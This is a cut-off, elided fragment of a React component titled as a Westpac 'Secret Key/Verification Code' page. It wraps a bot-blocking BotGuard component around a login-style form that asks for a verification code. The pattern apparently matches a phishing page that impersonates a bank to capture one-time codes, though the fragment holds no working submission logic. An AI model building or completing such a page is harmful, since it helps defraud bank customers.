...
/**
 * Westpac Secret Key/Verification Code Page
  ...
  return (
    <BotGuard>
      ...
      <div className="login-card">
        <h1 className="login-heading">Verification Code</h1>
        ...
        <form className="login-form" onSubmit={handleSubmit}>
          ...
          <div className="form-group">
            <label htmlFor="secret-key" className="form-group__label">Verification Code</label>
            <input
              type="text"
              id="secret-key"
              name="secret-key"
